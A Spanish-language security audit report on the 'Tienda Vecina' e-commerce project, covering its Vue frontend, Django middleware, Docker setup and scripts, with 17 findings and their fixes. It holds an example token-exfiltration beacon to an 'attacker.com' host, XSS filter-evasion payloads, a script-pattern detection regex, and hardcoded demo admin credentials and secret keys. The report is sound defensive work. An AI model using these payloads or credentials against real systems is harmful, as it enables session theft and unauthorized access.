# Informe de Auditoría de Seguridad: Frontend, Middleware, Infraestructura y Scripts
**Proyecto:** Tienda Vecina (`inacap-ecommerce`)  
**Rama Auditada:** `develop`  
**Alcance:** Frontend Vue 3, Stores Pinia, Middleware de Seguridad, Docker e Infraestructura, Scripts de Arranque/Parada y Plantillas `.env`  
**Fecha:** Noviembre 2026  
**Severidades:** Critical: 0 | High: 5 | Medium: 6 | Low: 6 (Total: 17 hallazgos confirmados)

---

## 1. Resumen Ejecutivo de la Postura de Seguridad

Se realizó un escrutinio exhaustivo e implacable del código cliente (Vue 3, Pinia, Axios, utilitarios de seguridad), middleware Django de cabeceras HTTP y auditoría ISO 27001, contenedores Docker, scripts de orquestación y archivos de configuración de entorno.

### Aspectos Positivos Comprobados:
1. **Ausencia de directiva `v-html`:** El código Vue 3 utiliza enlaces reactivos de texto estándar (`{{ }}`), lo que previene por defecto inyecciones HTML directas en la gran mayoría de las vistas.
2. **Dependencias limpias:** `npm audit` no arrojó vulnerabilidades conocidas (CVEs) en las versiones empaquetadas de Vite, Vue 3, Pinia y Tailwind.
3. **Control de Clickjacking y MIME-sniffing:** Cabeceras `X-Frame-Options: DENY` y `X-Content-Type-Options: nosniff` correctamente inyectadas por el middleware.

### Principales Vectores de Riesgo Identificados:
1. **Credenciales Administrativas y de Prueba Hardcodeadas:** Expuestas directamente en la interfaz de usuario (`AuthModal.vue`), compiladas en los assets de producción de Vite y coincidentes con el comando de siembra `seed_ecommerce`.
2. **Bypass Crítico por Stateful Regex (`RegExp.lastIndex`):** Los patrones globales `/g` compartidos en `security.js` causan que validaciones de entradas maliciosas fallen en llamadas alternas, permitiendo bypasses completos de cadenas de ataque.
3. **Lógica de Negocio y Manipulación de Cantidades en Carrito:** `CartDrawer.vue` invoca `addItem(..., -1)` en lugar de `updateQuantity`, permitiendo decrementar productos a cantidades cero y negativas, desincronizando la interfaz de usuario con la validación de base de datos.
4. **Exfiltración de Datos vía CSP Permisivo:** Cabecera `connect-src` e `img-src` con comodines `https:`, permitiendo tráfico de red o balizas hacia cualquier dominio externo HTTPS.
5. **Exposición Pública de PostgreSQL y Credenciales Triviales:** `docker-compose.yml` expone el puerto 5432 en `0.0.0.0` con usuario/contraseña `postgres:postgres`.
6. **Inyección de Registros (CRLF) e IP Spoofing:** En el middleware de auditoría ISO 27001 mediante la cabecera manipulable `X-Forwarded-For`.

---

## 2. Matriz General de Vulnerabilidades Identificadas

| ID | Área | Título de la Vulnerabilidad | Severidad | CWE |
| :---: | :--- | :--- | :---: | :---: |
| **SEC-FE-01** | Frontend Utils | Bypass de Validación por Estado de Expresión Regular (`lastIndex`) en `isSafeInput` | **HIGH** | CWE-185 |
| **SEC-FE-02** | Frontend Modals | Credenciales Administrativas y de Prueba Hardcodeadas en UI y Bundle | **HIGH** | CWE-798 |
| **SEC-FE-03** | Frontend Cart | Falla de Lógica de Negocio: Cantidades Negativas en Carrito de Compras | **HIGH** | CWE-20 |
| **SEC-INF-01** | Infraestructura | Puerto PostgreSQL Expuesto a Internet con Credenciales por Defecto | **HIGH** | CWE-287 |
| **SEC-INF-02** | Configuración | Claves Criptográficas Públicas en Plantillas `.env` y Fallback Inseguro en Settings | **HIGH** | CWE-321 |
| **SEC-FE-04** | Frontend Store | Almacenamiento Inseguro de Tokens JWT en `localStorage` y Sin Revocación Servidor | **MEDIUM** | CWE-922 |
| **SEC-FE-05** | Frontend Utils | Evasión de Filtro XSS por Sanitización en Una Sola Pasada en `sanitizeInput` | **MEDIUM** | CWE-116 |
| **SEC-FE-06** | Frontend Store | Suplantación de Tienda Oficial y Enlace Externo Arbitrario (Phishing) | **MEDIUM** | CWE-601 |
| **SEC-MID-01** | Middleware | Política CSP Permisiva con Comodín `https:` Permite Exfiltración de Datos | **MEDIUM** | CWE-1021 |
| **SEC-MID-02** | Middleware | Inyección de Logs (CRLF) y Falsificación de IP en Auditoría ISO 27001 | **MEDIUM** | CWE-117 |
| **SEC-INF-03** | Infraestructura | Uso Inseguro del Servidor de Desarrollo Django (`runserver`) en Docker y Scripts | **MEDIUM** | CWE-1188 |
| **SEC-FE-07** | Frontend Auth | Fuga de Confianza: Modificación de Roles y Permisos en el Cliente (`localStorage`) | **LOW** | CWE-602 |
| **SEC-FE-08** | Frontend Upload | Fuga de Memoria DOM por Falta de `URL.revokeObjectURL` en Subida de Fotos | **LOW** | CWE-400 |
| **SEC-MID-03** | Middleware | Ausencia de Cabecera HSTS y Conflicto en Permissions-Policy con Geolocalización | **LOW** | CWE-319 |
| **SEC-INF-04** | Dockerfiles | Ejecución de Contenedores Docker como Usuario `root` | **LOW** | CWE-250 |
| **SEC-INF-05** | Scripts | Terminación Indiscriminada de Procesos (`fuser -k` y `taskkill /F :5432`) | **LOW** | CWE-404 |
| **SEC-PKG-01** | Dependencias | Rangos SemVer Permisivos y Falta de Verificación de Integridad en Pipeline | **LOW** | CWE-1104 |

---

## 3. Hallazgos Detallados: Análisis, Vectores y Remediaciones

### SEC-FE-01: Bypass de Validación por Estado de Expresión Regular (`lastIndex`) en `isSafeInput`
- **Severidad:** **HIGH** (CVSS: 7.5)
- **Categoría de Ataque:** Input Validation Bypass / ReDoS / Regular Expression State Leak (CWE-185, CWE-1287)
- **Archivo y Líneas:** `frontend/src/utils/security.js#L11-L15` y `frontend/src/utils/security.js#L71-L76`
- **Mecánica y Vector de Explotación:**
  Las expresiones regulares `FORBIDDEN_XSS_REGEX` y `MALICIOUS_SCRIPT_PATTERNS` están declaradas como constantes globales a nivel de módulo con los flags `/g` y `/gi`:
  ```javascript
  export const FORBIDDEN_XSS_REGEX = /[<>{}\[\]*\\;^$|~`]/g
  export const MALICIOUS_SCRIPT_PATTERNS = /(javascript:|data:|vbscript:|on\w+=|<\s*script|<\s*iframe|<\s*embed|<\s*object)/gi
  ```
  En JavaScript, cuando una expresión regular con flag `/g` es evaluada mediante `.test(str)`, la propiedad interna `lastIndex` muta y se conserva para la siguiente invocación sobre esa misma instancia. Si un atacante envía una carga maliciosa (ej. `javascript:alert(1)`), la primera llamada devuelve `false`, pero avanza `lastIndex`. En la segunda llamada, `.test()` busca desde ese índice hacia adelante; al no encontrar coincidencias posteriores, retorna `false` (no match) y reinicia `lastIndex` a 0. Consecuentemente, `isSafeInput` retorna `true` (aprobado).
  Demostración ejecutada:
  ```
  Call 1: isSafeInput("javascript:alert(1)") = false
  Call 2: isSafeInput("javascript:alert(1)") = true  <-- BYPASS
  Call 3: isSafeInput("javascript:alert(1)") = false
  Call 4: isSafeInput("javascript:alert(1)") = true  <-- BYPASS
  ```
- **Impacto:** Cualquier campo o lógica que utilice `isSafeInput` para validar datos antes de persistir o procesar aprueba ataques en el 50% de las invocaciones.
- **Remediación:** Remover el flag `/g` de las expresiones regulares utilizadas para validación booleana (`.test()`), o reiniciar explícitamente `regex.lastIndex = 0` antes de cada evaluación, o utilizar una instancia local nueva en cada llamada:
  ```javascript
  export function isSafeInput(str) {
    if (typeof str !== 'string') return true
    const forbiddenRegex = /[<>{}\[\]*\\;^$|~`]/
    const scriptPatterns = /(javascript:|data:|vbscript:|on\w+=|<\s*script|<\s*iframe|<\s*embed|<\s*object)/i
    return !forbiddenRegex.test(str) && !scriptPatterns.test(str)
  }
  ```

---

### SEC-FE-02: Credenciales Administrativas y de Prueba Hardcodeadas en UI y Bundle
- **Severidad:** **HIGH** (CVSS: 8.2)
- **Categoría de Ataque:** Use of Hard-coded Credentials / Sensitive Data Exposure (CWE-798, CWE-312)
- **Archivo y Líneas:** `frontend/src/components/AuthModal.vue#L251-L278`
- **Mecánica y Vector de Explotación:**
  El componente `AuthModal.vue` incluye botones de auto-completado rápido para pruebas:
  ```vue
  <button @click="fillDemo('vendedor@inacap.cl', 'Vendedor1234!', 'SELLER')">Vendedor</button>
  <button @click="fillDemo('comprador@inacap.cl', 'Comprador1234!', 'BUYER')">Comprador</button>
  <button @click="fillDemo('admin@inacap.cl', 'Admin1234!', 'ADMIN')">Admin</button>
  ```
  Estas credenciales coinciden exactamente con las creadas por `seed_ecommerce.py` (`admin_user.set_password('Admin1234!')`). Al compilarse para producción con `vite build`, las credenciales quedan incrustadas en el archivo JavaScript público (`dist/assets/index-*.js`) y son visibles para cualquier usuario que abra la interfaz de inicio de sesión.
- **Impacto:** Acceso no autorizado total con privilegios de Administrador (`admin@inacap.cl`), permitiendo manipular productos, precios, usuarios y configuraciones de la plataforma.
- **Remediación:**
  1. Eliminar completamente el bloque de botones demo de `AuthModal.vue` o condicionarlo estrictamente a una variable de entorno de desarrollo:
     ```vue
     <div v-if="import.meta.env.DEV && import.meta.env.VITE_ENABLE_DEMO_CREDENTIALS === 'true'">
     ```
  2. Forzar que en producción el comando `seed_ecommerce` requiera contraseñas suministradas por variables de entorno seguras (`ADMIN_INITIAL_PASSWORD`) y nunca cadenas fijas.

---

### SEC-FE-03: Falla de Lógica de Negocio: Cantidades Negativas en Carrito de Compras
- **Severidad:** **HIGH** (CVSS: 7.1)
- **Categoría de Ataque:** Business Logic Flaw / Improper Input Validation (CWE-840, CWE-20)
- **Archivo y Líneas:** `frontend/src/components/CartDrawer.vue#L124-L138`, `frontend/src/stores/cart.js#L37-L50`
- **Mecánica y Vector de Explotación:**
  En `CartDrawer.vue`, el botón para decrementar cantidad ejecuta:
  ```vue
  <button @click="cartStore.addItem(item.product, -1)">
    <Minus class="w-3 h-3" />
  </button>
  ```
  En `cartStore.addItem`, se realiza la suma algebraica sin validación de umbral inferior:
  ```javascript
  addItem(product, quantity = 1) {
    const existing = this.items.find((it) => it.product.id === product.id)
    if (existing) {
      existing.quantity += quantity
  ```
  La función `updateQuantity(productId, delta)` que sí valida `if (item.quantity <= 0) this.removeItem(productId)` no es utilizada por el componente.
  Como resultado:
  - Un usuario puede reducir la cantidad a `0`, `-1`, `-2`, etc.
  - `displayTotal` calcula `it.product.price * it.quantity`, arrojando subtotales negativos.
  - Al proceder al checkout, el cliente envía cantidades negativas en el payload a `/payments/cart/calculate/` y `/payments/transbank/init/`.
  - En el backend, `calculate_safe_cart_totals` omite productos con `qty <= 0` pero no rechaza la petición como inválida si hay otros productos presentes, generando un descalce financiero entre la cifra visible al usuario y el monto cobrado.
- **Impacto:** Corrupción del estado del carrito en `localStorage`, desincronización de cálculos de pasarela y potencial manipulación de montos.
- **Remediación:** Reemplazar la llamada en `CartDrawer.vue` por `cartStore.updateQuantity(item.product.id, -1)` y agregar una guarda estricta en `cartStore.addItem`:
  ```javascript
  if (existing) {
    const nextQty = existing.quantity + quantity
    if (nextQty <= 0) {
      this.removeItem(product.id)
      return
    }
    existing.quantity = nextQty
  }
  ```

---

### SEC-INF-01: Puerto PostgreSQL Expuesto a Internet con Credenciales por Defecto
- **Severidad:** **HIGH** (CVSS: 8.6)
- **Categoría de Ataque:** Security Misconfiguration / Default Credentials (CWE-287, CWE-522)
- **Archivo y Líneas:** `docker-compose.yml#L5-L10`
- **Mecánica y Vector de Explotación:**
  En `docker-compose.yml`, el servicio `db` define:
  ```yaml
  environment:
    POSTGRES_DB: inacap_ecommerce
    POSTGRES_USER: postgres
    POSTGRES_PASSWORD: postgres
  ports:
    - "5432:5432"
  ```
  La directiva `"5432:5432"` vincula el puerto de la base de datos a `0.0.0.0` en el host anfitrión. Si el contenedor se despliega en una máquina virtual en la nube (AWS, Azure, GCP o VPS) o red local sin firewall específico para Docker, el motor PostgreSQL queda expuesto públicamente a internet con usuario `postgres` y clave `postgres`.
- **Impacto:** Conexión remota directa no autenticada de actores maliciosos, permitiendo el volcado completo de usuarios, contraseñas hash, productos y órdenes de compra, o el borrado/secuestro (Ransomware) de la base de datos.
- **Remediación:**
  1. Eliminar la sección `ports:` en el servicio `db` para que el acceso sea exclusivamente interno a través de la red privada de Docker (`inacap_backend_api -> db:5432`).
  2. Si se requiere depuración local, vincular únicamente a la interfaz loopback: `"127.0.0.1:5432:5432"`.
  3. No fijar contraseñas en texto claro en `docker-compose.yml`; utilizar variables de entorno referenciadas (`POSTGRES_PASSWORD: ${DB_PASSWORD}`).

---

### SEC-INF-02: Claves Criptográficas Públicas en Plantillas `.env` y Fallback Inseguro en Settings
- **Severidad:** **HIGH** (CVSS: 7.9)
- **Categoría de Ataque:** Hardcoded Cryptographic Secrets / Cryptographic Key Reuse (CWE-321, CWE-798)
- **Archivo y Líneas:** `.env.example#L29,L74`, `backend/config/settings.py#L205`
- **Mecánica y Vector de Explotación:**
  En `.env.example`, `example.env` y `backend/.env.example` se incluyen claves estáticas conocidas:
  `SECRET_KEY=django-insecure-inacap-ecommerce-secure-key-iso27001-development-mode-2026`
  `JWT_SECRET_KEY=inacap-jwt-super-secret-iso27001-signature-key-2026`
  En `backend/config/settings.py`:
  ```python
  JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', SECRET_KEY)
  ```
  Si un administrador omite `JWT_SECRET_KEY` o reutiliza los valores del ejemplo, el secreto de firma HMAC-SHA256 para los tokens JWT es de conocimiento público. Un atacante puede forjar tokens JWT arbitrarios con `{"user_id": 1, "role": "ADMIN"}` y autenticarse con máximos privilegios en cualquier endpoint de la API.
- **Impacto:** Falsificación de identidad (Identity Spoofing), escalamiento de privilegios vertical y compromiso criptográfico total de las sesiones.
- **Remediación:**
  1. En `settings.py`, impedir que `JWT_SECRET_KEY` tenga como fallback `SECRET_KEY`; debe ser obligatorio y distinto en entornos que no sean pruebas unitarias:
     ```python
     JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY')
     if not JWT_SECRET_KEY:
         raise RuntimeError("[SECURITY ERROR] JWT_SECRET_KEY must be independently configured.")
     ```
  2. En scripts de despliegue, verificar que las claves contengan alta entropía generada dinámicamente (`openssl rand -hex 32`).

---

### SEC-FE-04: Almacenamiento Inseguro de Tokens JWT en `localStorage` y Sin Revocación Servidor
- **Severidad:** **MEDIUM** (CVSS: 6.8)
- **Categoría de Ataque:** Insecure Storage of Sensitive Data / Missing Token Revocation (CWE-922, CWE-613)
- **Archivo y Líneas:** `frontend/src/stores/auth.js#L83,L164-L165`, `frontend/src/services/api.js#L16`
- **Mecánica y Vector de Explotación:**
  El token JWT se almacena directamente en `localStorage.setItem('inacap_auth_token', token)`. Cualquier script ejecutado en el mismo origen (vía XSS, extensión maliciosa o dependencia comprometida) puede acceder al token mediante `localStorage.getItem()`. Además, cuando el usuario presiona "Cerrar Sesión", únicamente se borra la clave en el cliente JavaScript; no existe un endpoint de revocación (blacklist de tokens) en el backend, por lo que el token sigue siendo válido ante el servidor por hasta 7 días (`JWT_EXPIRATION_HOURS = 168`).
- **Impacto:** Robo persistente de sesiones sin posibilidad de invalidación oportuna.
- **Remediación:**
  1. Migrar la autenticación a cookies `HttpOnly`, `Secure` y `SameSite=Lax` emitidas por Django, impidiendo el acceso a JavaScript.
  2. Implementar una lista de bloqueo en Redis o base de datos para registrar identificadores de tokens revocados (`jti`) en eventos de cierre de sesión.

---

### SEC-FE-05: Evasión de Filtro XSS por Sanitización en Una Sola Pasada en `sanitizeInput`
- **Severidad:** **MEDIUM** (CVSS: 6.1)
- **Categoría de Ataque:** Insufficient Sanitization / Filter Evasion (CWE-116, CWE-79)
- **Archivo y Líneas:** `frontend/src/utils/security.js#L21-L27`, `frontend/src/utils/security.js#L53-L64`
- **Mecánica y Vector de Explotación:**
  `sanitizeInput` implementa una remoción en una sola pasada:
  ```javascript
  return input
    .replace(FORBIDDEN_XSS_REGEX, '')
    .replace(MALICIOUS_SCRIPT_PATTERNS, '')
    .trim()
  ```
  Si se introduce un patrón anidado como `javasjavascript:cript:alert(1)`, el reemplazo elimina la ocurrencia interna y reconstruye el esquema peligroso: `javascript:alert(1)`.
  Asimismo, `sanitizeEventInput` (utilizado en `@input` en casi todos los formularios) solo aplica `FORBIDDEN_XSS_REGEX` y no verifica patrones de scripts maliciosos.
- **Impacto:** Inserción de cargas que eluden los filtros del cliente y se propagan hacia el backend.
- **Remediación:** Utilizar una biblioteca madura y auditada de sanitización como `DOMPurify` para cualquier contenido con formato enriquecido, o aplicar validación estricta de lista blanca (alphanumeric whitelist) en campos de texto plano.

---

### SEC-FE-06: Suplantación de Tienda Oficial y Enlace Externo Arbitrario (Phishing)
- **Severidad:** **MEDIUM** (CVSS: 5.4)
- **Categoría de Ataque:** Open Redirect / Brand Impersonation / Phishing Linkage (CWE-601, CWE-1021)
- **Archivo y Líneas:** `frontend/src/components/ProductCleanUrlView.vue#L254-L262`, `frontend/src/components/RegisterStoreModal.vue#L59-L62`
- **Mecánica y Vector de Explotación:**
  Cualquier vendedor puede registrar un nombre de "Tienda Oficial" y una URL externa sin validación administrativa:
  ```vue
  <a
    :href="product.seller_official_store_url"
    target="_blank"
    rel="noopener noreferrer"
    class="font-bold text-brand-accent hover:underline inline-flex items-center gap-1"
  >
    <span>{{ product.seller_official_store_name }}</span>
    <ExternalLink class="w-3 h-3" />
  </a>
  ```
  Un vendedor malicioso puede ingresar el nombre "Samsung Store Oficial" o "BancoEstado" e introducir una URL de phishing (`https://samsung-ofertas-chile.phishing.cl`). El comprador, confiando en el distintivo de tienda oficial de Tienda Vecina, hace clic en el enlace y es redirigido a un sitio fraudulento.
- **Impacto:** Fraude a compradores, pérdida de reputación de la plataforma y facilitación de ataques de phishing.
- **Remediación:**
  1. Requerir aprobación y moderación administrativa previa para otorgar el distintivo de tienda oficial y habilitar enlaces externos.
  2. Implementar una página intermedia de aviso de salida o restringir dominios a una lista blanca verificada.

---

### SEC-MID-01: Política CSP Permisiva con Comodín `https:` Permite Exfiltración de Datos
- **Severidad:** **MEDIUM** (CVSS: 5.3)
- **Categoría de Ataque:** Security Misconfiguration / Permissive CSP (CWE-1021, CWE-693)
- **Archivo y Líneas:** `backend/apps/security/middleware.py#L22-L30`
- **Mecánica y Vector de Explotación:**
  La política Content-Security-Policy incluye:
  ```python
  response['Content-Security-Policy'] = (
      "default-src 'self'; "
      "script-src 'self'; "
      "style-src 'self' 'unsafe-inline'; "
      "img-src 'self' data: https:; "
      "connect-src 'self' http://localhost:* http://127.0.0.1:* https:; "
      "font-src 'self' https: data:; "
      "frame-ancestors 'none';"
  )
  ```
  La directiva `connect-src` contiene el esquema comodín `https:`, lo que autoriza al navegador a realizar conexiones XHR, `fetch` o `WebSocket` hacia **cualquier** servidor HTTPS en internet. Del mismo modo, `img-src` permite cargar imágenes desde cualquier dominio HTTPS, lo cual facilita la fuga de credenciales o tokens mediante balizas de imagen (`new Image().src = 'https://attacker.com/leak?t=' + token`).
- **Impacto:** Inutiliza la defensa en profundidad que debe brindar CSP para impedir la exfiltración de información sensible ante ataques en el cliente.
- **Remediación:** Delimitar explícitamente los orígenes externos autorizados en `connect-src` e `img-src` (ej. URLs de Transbank, CDNs de imágenes de Unsplash o S3) en lugar de utilizar el comodín abierto `https:`.

---

### SEC-MID-02: Inyección de Logs (CRLF) y Falsificación de IP en Auditoría ISO 27001
- **Severidad:** **MEDIUM** (CVSS: 5.3)
- **Categoría de Ataque:** Improper Output Neutralization for Logs / Audit Spoofing (CWE-117)
- **Archivo y Líneas:** `backend/apps/security/middleware.py#L46-L50`
- **Mecánica y Vector de Explotación:**
  El middleware de auditoría extrae la IP del cliente directamente de la cabecera HTTP:
  ```python
  ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', 'Unknown'))
  logger.info(
      f"[AUDIT] Method: {request.method} | Path: {request.path} | Status: {response.status_code} "
      f"| User: {user_info} | IP: {ip} | Time: {duration:.3f}s"
  )
  ```
  Cualquier cliente puede enviar una cabecera arbitraria `X-Forwarded-For: 200.1.1.1` para falsear el registro forense. Además, la variable `ip` se interpola sin eliminar caracteres de control (`\r`, `\n`). Un atacante puede inyectar saltos de línea para fabricar registros falsos de auditoría de seguridad ISO 27001 (Log Injection).
- **Impacto:** Corrupción e invalidez de los registros de auditoría requeridos por la norma ISO/IEC 27001 cláusula A.8.15.
- **Remediación:** Sanitizar `ip` eliminando caracteres que no correspondan a direcciones IPv4/IPv6 válidas y tomar la IP exclusivamente de `REMOTE_ADDR` salvo que la aplicación se encuentre detrás de un reverse proxy de confianza verificado (`django-ipware` o `SECURE_PROXY_SSL_HEADER`).

---

### SEC-INF-03: Uso Inseguro del Servidor de Desarrollo Django (`runserver`) en Docker y Scripts
- **Severidad:** **MEDIUM** (CVSS: 5.9)
- **Categoría de Ataque:** Deployment Misconfiguration / Insecure Server Software (CWE-1188)
- **Archivo y Líneas:** `docker-compose.yml#L27`, `backend/Dockerfile#L20`, `iniciar_servicios.sh#L17`
- **Mecánica y Vector de Explotación:**
  Tanto el contenedor Docker de backend como los scripts de inicio ejecutan:
  `python manage.py runserver 0.0.0.0:8000`
  La documentación oficial de Django advierte expresamente que `runserver` no ha sido sometido a auditorías de seguridad ni pruebas de estrés. En caso de recibir peticiones malformadas o concurrentes masivas (Slowloris), el servidor se bloquea o agota recursos fácilmente. Si `DEBUG=True`, expone además trazas de depuración completas en errores 500.
- **Impacto:** Denegación de servicio (DoS) y potencial exposición de configuraciones internas.
- **Remediación:** Utilizar un servidor WSGI/ASGI de grado de producción como Gunicorn o Uvicorn (`gunicorn config.wsgi:application --bind 0.0.0.0:8000 --workers 4`) para Docker y despliegues productivos.

---

### SEC-FE-07: Fuga de Confianza: Modificación de Roles y Permisos en el Cliente (`localStorage`)
- **Severidad:** **LOW** (CVSS: 3.8)
- **Categoría de Ataque:** Client-Side Authorization / Broken Trust Boundary (CWE-602)
- **Archivo y Líneas:** `frontend/src/stores/auth.js#L8,L26-L28`
- **Mecánica y Vector de Explotación:**
  El store `auth.js` define:
  ```javascript
  isAdmin: (state) => state.user?.role === 'ADMIN',
  isSeller: (state) => state.user?.role === 'SELLER' || state.user?.role === 'ADMIN',
  ```
  Cargando el estado directamente desde `localStorage.getItem('inacap_auth_user')`. Un usuario comprador puede modificar este JSON en las herramientas de desarrollador y asignarse `role: "ADMIN"`. Aunque el backend deniega las operaciones sensibles que requieren permisos, la interfaz de usuario desbloquea paneles restringidos (ej. "Mis Publicaciones" y opciones de edición), provocando comportamiento anómalo.
- **Impacto:** Inconsistencia de interfaz y suposición errónea de seguridad basada en el cliente.
- **Remediación:** Derivar los privilegios de un token JWT firmado validado o mediante la respuesta del endpoint `/auth/me/` en cada inicio de sesión, manteniendo la verdad del estado de autorización en el backend.

---

### SEC-FE-08: Fuga de Memoria DOM por Falta de `URL.revokeObjectURL` en Subida de Fotos
- **Severidad:** **LOW** (CVSS: 3.3)
- **Categoría de Ataque:** Resource Management / Memory Leak (CWE-400, CWE-772)
- **Archivo y Líneas:** `frontend/src/components/CreateProductModal.vue#L102`, `frontend/src/components/EditProductModal.vue#L423`
- **Mecánica y Vector de Explotación:**
  Al subir fotografías para crear o editar productos, se crean URLs de objetos DOM con `URL.createObjectURL(file)`. Estas URLs permanecen en memoria en el navegador y nunca son liberadas mediante `URL.revokeObjectURL(url)` cuando se descarta la foto o se cierra el modal, generando consumo progresivo de memoria en sesiones prolongadas.
- **Impacto:** Degradación de rendimiento del navegador en equipos clientes.
- **Remediación:** Invocar `URL.revokeObjectURL(photo.url)` al remover la fotografía o en el ciclo de vida `onUnmounted` del componente.

---

### SEC-MID-03: Ausencia de Cabecera HSTS y Conflicto en Permissions-Policy con Geolocalización
- **Severidad:** **LOW** (CVSS: 3.7)
- **Categoría de Ataque:** Missing Cryptographic Control / Feature Policy Conflict (CWE-319, CWE-693)
- **Archivo y Líneas:** `backend/apps/security/middleware.py#L16-L21`
- **Mecánica y Vector de Explotación:**
  1. Falta la cabecera `Strict-Transport-Security` (HSTS), dejando a los usuarios expuestos a degradación de cifrado (SSL Stripping) en la primera conexión.
  2. `Permissions-Policy` especifica `geolocation=()`, lo cual bloquea activamente la API de geolocalización del navegador. No obstante, `LocationModal.vue` ofrece la funcionalidad `useCurrentGeoLocation()` (`navigator.geolocation.getCurrentPosition`), provocando una falla silenciosa en los clientes.
- **Impacto:** Exposición ante ataques Man-in-the-Middle y funcionalidad bloqueada en el cliente.
- **Remediación:**
  1. Agregar `response['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'`.
  2. Ajustar `Permissions-Policy` a `geolocation=(self)` si se desea permitir geolocalización para la selección de dirección de despacho.

---

### SEC-INF-04: Ejecución de Contenedores Docker como Usuario `root`
- **Severidad:** **LOW** (CVSS: 3.8)
- **Categoría de Ataque:** Principle of Least Privilege Violation (CWE-250)
- **Archivo y Líneas:** `backend/Dockerfile#L1-L20`, `frontend/Dockerfile#L1-L12`
- **Mecánica y Vector de Explotación:**
  Ni el Dockerfile de backend ni el de frontend crean o conmutan a un usuario no privilegiado (`USER`). Los procesos de Django y Node.js se ejecutan con privilegios de `root` dentro de los contenedores. Si se presentase una vulnerabilidad de escape o escritura arbitraria, el atacante comprometería el sistema de archivos del host con privilegios de superusuario.
- **Impacto:** Aumento del radio de impacto ante eventuales vulnerabilidades en tiempo de ejecución.
- **Remediación:** Crear usuarios de servicio no privilegiados en los Dockerfiles (`RUN useradd -m -u 1000 appuser && chown -R appuser /app` y cambiar a `USER appuser`).

---

### SEC-INF-05: Terminación Indiscriminada de Procesos (`fuser -k` y `taskkill /F :5432`)
- **Severidad:** **LOW** (CVSS: 3.5)
- **Categoría de Ataque:** Denial of Service / Process Interference (CWE-404)
- **Archivo y Líneas:** `detener_servicios.sh#L16-L17`, `detener_servicios.bat#L9`
- **Mecánica y Vector de Explotación:**
  `detener_servicios.sh` ejecuta `fuser -k 8000/tcp` y `5173/tcp`, matando cualquier proceso ajeno que ocupe esos puertos sin importar su PID. De forma más crítica, `detener_servicios.bat` ejecuta:
  `for /f "tokens=5" %%a in ('netstat -aon ^| findstr :5432') do taskkill /PID %%a /F`
  Esto finaliza forzosamente (`SIGKILL`) cualquier instancia de PostgreSQL en la máquina, pudiendo corromper archivos de bases de datos compartidas del desarrollador (`pgdata`).
- **Impacto:** Riesgo de corrupción de datos y detención accidental de servicios ajenos.
- **Remediación:** Limitar la detención únicamente a los PIDs almacenados en los archivos `.pid` generados durante el inicio y utilizar comandos de apagado graceful (`pg_ctl stop` o `systemctl stop postgresql`).

---

### SEC-PKG-01: Rangos SemVer Permisivos y Falta de Verificación de Integridad en Pipeline
- **Severidad:** **LOW** (CVSS: 2.5)
- **Categoría de Ataque:** Software Supply Chain Risk (CWE-1104, CWE-353)
- **Archivo y Líneas:** `frontend/package.json#L11-L25`
- **Mecánica y Vector de Explotación:**
  Las dependencias usan prefijos carets `^` (ej. `"axios": "^1.21.0"`). Si se ejecuta `npm install` en entornos de integración continua sin `package-lock.json` o sin flags de congelación, pueden instalarse versiones menores que introduzcan regresiones o paquetes maliciosos (ataques a la cadena de suministro).
- **Impacto:** Riesgo de compromiso de la cadena de suministro en builds automatizados.
- **Remediación:** Ejecutar `npm ci` en lugar de `npm install` en entornos de integración continua y despliegue, y fijar hashes de integridad mediante `package-lock.json`.

---

## 4. Plan de Acción Priorizado para Remediación

1. **Inmediato (P0 - Próximas 24 horas):**
   - Eliminar los botones demo con credenciales de administrador en `frontend/src/components/AuthModal.vue`.
   - Corregir el bug de `RegExp.lastIndex` en `frontend/src/utils/security.js` eliminando el flag `/g` de las funciones de validación.
   - Corregir la llamada a `updateQuantity` en `frontend/src/components/CartDrawer.vue` para impedir cantidades negativas.
   - Cerrar el puerto 5432 en `docker-compose.yml` para evitar exposición pública de PostgreSQL.
2. **Corto Plazo (P1 - Próxima semana):**
   - Restringir la directiva CSP `connect-src` e `img-src` eliminando el comodín global `https:`.
   - Sanitizar la cabecera `X-Forwarded-For` en `SecurityAuditLoggingMiddleware` contra inyección CRLF.
   - Configurar variables de entorno obligatorias e independientes para `JWT_SECRET_KEY` en `settings.py`.
   - Reemplazar `runserver` por `gunicorn` en `docker-compose.yml` y `backend/Dockerfile`.
3. **Mediano Plazo (P2 - Siguiente release):**
   - Migrar el almacenamiento de tokens JWT de `localStorage` a cookies `HttpOnly` y `Secure`.
   - Implementar moderación administrativa previa para el otorgamiento del distintivo de Tienda Oficial y enlaces externos.
   - Crear usuarios no privilegiados en Dockerfiles y refactorizar scripts de parada para evitar `taskkill` indiscriminados.
